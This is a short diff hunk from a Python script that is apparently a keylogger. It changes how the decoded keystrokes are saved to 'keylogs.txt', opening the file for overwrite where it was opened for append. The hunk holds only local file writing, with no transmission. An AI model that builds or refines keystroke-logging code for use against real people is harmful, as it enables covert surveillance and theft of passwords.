@@ -31,7 +31,7 @@ def file_write(keys):
     decoded_keys = [key_mapping.get(key, key) for key in keys]
     decoded_text = ''.join(decoded_keys)
 
-    with open("keylogs.txt", "a") as file:
+    with open("keylogs.txt", "w") as file:
         file.write(decoded_text + ' ')
 
 
